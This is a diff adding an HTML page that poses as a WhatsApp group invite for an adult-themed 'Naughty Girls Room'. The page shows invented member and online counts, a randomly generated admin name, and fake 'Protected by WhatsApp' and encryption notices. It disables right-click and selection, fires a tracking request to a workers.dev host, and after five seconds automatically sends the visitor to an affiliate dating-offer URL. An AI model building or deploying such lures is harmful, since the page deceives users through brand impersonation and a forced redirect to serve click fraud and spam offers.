@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Group Invitation</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,sans-serif;background:#000;overflow:hidden;height:100vh;color:#fff;position:relative}
+        .bg-video{position:absolute;top:50%;left:50%;min-width:100%;min-height:100%;width:auto;height:auto;transform:translate(-50%,-50%);z-index:-2;object-fit:cover}
+        .blur-content{background:rgba(0,0,0,0.45); backdrop-filter:blur(8px);height:100vh;display:flex;flex-direction:column}
+        .whatsapp-header{display:flex;align-items:center;padding:15px;background:#075e54;color:#fff;position:relative;z-index:1}
+        .back-button{font-size:22px;cursor:pointer;margin-right:15px}
+        .header-text h1{font-size:19px;font-weight:500}
+        .header-text p{font-size:14px;opacity:0.8}
+        .main-content{
+            flex:1;
+            display:flex;
+            flex-direction:column;
+            justify-content:space-between;
+            padding:20px 20px 10px;
+            align-items:center;
+            text-align:center;
+        }
+        .profile-container,.members-info,.notification,.join-button{opacity:0;transform:translateY(20px);transition:all .5s}
+        .profile-img{background:#128c7e;width:90px;height:90px;border-radius:50%;margin:0 auto 12px;display:flex;align-items:center;justify-content:center;font-size:40px}
+        .group-name{font-size:20px;font-weight:600;margin-bottom:6px}
+        .group-info{font-size:14px;opacity:0.8;margin-bottom:20px}
+        .members-info{display:flex;justify-content:space-around;width:100%;max-width:400px;margin:25px 0}
+        .member-count,.active-members{text-align:center;cursor:pointer;position:relative;flex:1}
+        .count{font-size:26px;font-weight:bold;margin:8px 0}
+        .label{font-size:14px;opacity:0.8}
+        .online-indicator{display:flex;align-items:center;justify-content:center;font-size:14px;margin-top:5px}
+        .dot{width:8px;height:8px;background:#00ff00;border-radius:50%;margin-right:6px;animation:pulse 2s infinite}
+        @keyframes pulse{0%{opacity:1}50%{opacity:0.4}100%{opacity:1}}
+        .notification{background:rgba(255,255,255,0.1);padding:12px;border-radius:8px;font-size:14px;margin:20px 0;line-height:1.5;width:100%;max-width:400px}
+        .join-button{
+            background:#25d366;color:#fff;border:none;padding:18px 30px;font-size:18px;border-radius:50px;cursor:pointer;
+            display:flex;align-items:center;justify-content:center;gap:12px;margin:15px auto 0;
+            width:90%;max-width:400px;font-weight:bold;box-shadow:0 6px 20px rgba(0,0,0,0.5);
+        }
+        .join-button i{font-size:26px}
+        .join-button:disabled{opacity:0.7;cursor:not-allowed}
+        .security-notice{text-align:center;font-size:13px;opacity:0.7;margin:10px 0}
+        .footer{text-align:center;font-size:12px;padding:12px;background:rgba(0,0,0,0.4);line-height:1.5}
+        .message-popup{position:absolute;background:#000;color:#fff;padding:8px 12px;border-radius:6px;font-size:13px;white-space:nowrap;
+            bottom:100%;left:50%;transform:translateX(-50%);opacity:0;transition:opacity .3s;z-index:10}
+        .message-popup::after{content:"";position:absolute;top:100%;left:50%;margin-left:-8px;border:8px solid transparent;border-top-color:#000}
+        .show{opacity:1}
+    </style>
+</head>
+<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
+
+    <video class="bg-video" id="bgVideo" autoplay muted loop playsinline preload="auto"></video>
+
+    <div class="blur-content">
+        <div class="whatsapp-header">
+            <div class="back-button" onclick="history.back()"><i class="fas fa-arrow-left"></i></div>
+            <div class="header-text">
+                <h1>Naughty Girls Room</h1>
+                <p>WhatsApp</p>
+            </div>
+        </div>
+
+        <div class="main-content">
+            <div class="profile-container">
+                <div class="profile-img"><i class="fas fa-users"></i></div>
+                <div class="group-name">Naughty Girls Room</div>
+                <div class="group-info" id="adminText"></div>
+            </div>
+
+            <div class="members-info">
+                <div class="member-count" id="memberCount">
+                    <div class="message-popup" id="messagePopup1">People Who Have Actively Enjoyed This Service</div>
+                    <div class="count" id="totalMembers">106.7K</div>
+                    <div class="label">Members</div>
+                </div>
+                <div class="active-members" id="activeMembers">
+                    <div class="message-popup" id="messagePopup2">People Who Have Actively Enjoyed This Service</div>
+                    <div class="count" id="onlineMembers">43.2K</div>
+                    <div class="online-indicator"><div class="dot"></div><span>Online</span></div>
+                </div>
+            </div>
+
+            <div class="notification">
+                <i class="fas fa-lock"></i>
+                <span>New messages and calls are secured with end-to-end encryption. Only people in this chat can read, listen, or share them.</span>
+            </div>
+
+            <button class="join-button" id="joinButton">
+                <i class="fab fa-whatsapp"></i>
+                <span>Join group</span>
+            </button>
+
+            <div class="security-notice">
+                <i class="fas fa-shield-alt"></i> <span>Protected by WhatsApp</span>
+            </div>
+        </div>
+
+        <div class="footer">
+            By clicking "Join the group", you agree to share contact information with group administrator and other participants.
+        </div>
+    </div>
+
+    <script>
+        // Offer URL
+        const OFFERS = ["https://zokxjg.datingllove.com/?utm_source=da57dc555e50572d&ban=other&j5=1&j6=1&s1=23300&s2=2184877&s3=KAHF&click_id=KAHF"];
+        let TARGET_URL = OFFERS[0];
+
+        // Video list
+        const videoList = [
+            "" || "https://ceafgif.flirtpixel.com/bundle/921/assets/images/video-1.mp4",
+            "https://files.catbox.moe/387f3z.mp4",
+            "https://files.catbox.moe/y2fr1u.mp4",
+            "https://files.catbox.moe/o2bcz2.mp4",
+            "https://files.catbox.moe/jytnih.mp4",
+            "https://files.catbox.moe/1q99k0.mp4",
+            "https://files.catbox.moe/wkzv09.mp4",
+            "https://files.catbox.moe/9v2zxi.mp4",
+            "https://thumbsnap.com/i/37t8zezA.mp4",
+            "https://thumbsnap.com/i/2ycQSNZa.mp4",
+            "https://thumbsnap.com/i/AY9zveVs.mp4",
+            "https://thumbsnap.com/i/gzm5dPiX.mp4",
+            "https://assets.mixkit.co/videos/preview/mixkit-set-of-abstract-circles-loop-11805-large.mp4"
+        ];
+
+        const videoEl = document.getElementById('bgVideo');
+
+        function loadRandomVideo() {
+            const idx = Math.floor(Math.random() * videoList.length);
+            videoEl.src = videoList[idx];
+            videoEl.load();
+            videoEl.play().catch(() => {
+                videoList.splice(idx, 1);
+                if (videoList.length > 0) loadRandomVideo();
+                else document.body.style.background = 'linear-gradient(135deg,#075e54,#128c7e)';
+            });
+        }
+
+        // Random admin name
+        const firstNames = ["Emily","Sophia","Isabella","Mia","Ava","Olivia","Luna","Chloe","Zoe","Anna","Lisa","Sarah","Putri","Siti","Ayu","Dewi","Intan","Citra","Tiara","Bella","Aisyah","Vanessa","Jessica","Angel"];
+        const lastNames = ["Whitney","Johnson","Miller","Davis","Garcia","Martinez","Lopez","Wilson","Anderson","Thomas","Moore","Perez","Harris","Clark","Lewis","Walker","Young","King","Scott","Nguyen","Adams","Hall"];
+        function getRandomName(){return firstNames[Math.floor(Math.random()*firstNames.length)]+" "+lastNames[Math.floor(Math.random()*lastNames.length)];}
+
+        // Redirect logic
+        const params = new URLSearchParams(window.location.search);
+        let finalUrl = TARGET_URL + (params.toString() ? (TARGET_URL.includes('?') ? '&' : '?') + params.toString() : '');
+        
+        // Auto redirect
+        setTimeout(() => {
+            location.href = finalUrl;
+        }, 5 * 1000);
+        
+        // Manual redirect
+        document.getElementById('joinButton').onclick = () => {
+            location.href = finalUrl;
+        };
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            // Tracking
+            fetch('https://imopol.dasboardkramat.workers.dev/track?cid=KAHF', { method: 'GET', keepalive: true });
+
+            loadRandomVideo();
+            document.getElementById('adminText').textContent = "Admin & Moderator: " + getRandomName();
+            
+            const els = document.querySelectorAll('.profile-container, .members-info, .notification, .join-button');
+            els.forEach((el,i) => setTimeout(()=>{el.style.opacity='1';el.style.transform='translateY(0)'},i*200));
+        });
+
+        // Popup functions
+        function showPopup(id){
+            const p=document.getElementById(id);
+            p.classList.add('show');
+            setTimeout(()=>p.classList.remove('show'),2200);
+        }
+        document.getElementById('memberCount').onclick=()=>showPopup('messagePopup1');
+        document.getElementById('active-members').onclick=()=>showPopup('messagePopup2');
+
+        // Button animation
+        const btn = document.getElementById('joinButton');
+        function go(){
+            btn.innerHTML='<i class="fas fa-spinner fa-spin"></i> Redirecting...';
+            btn.disabled=true;
+            setTimeout(()=>location.href=finalUrl,800);
+        }
+        btn.onclick=go;
+        btn.ontouchend=e=>{e.preventDefault();go();}
+        btn.oncontextmenu=e=>{e.preventDefault();go();}
+
+        // Force play video
+        document.body.onclick = () => videoEl.play();
+    </script>
+</body>
+</html>
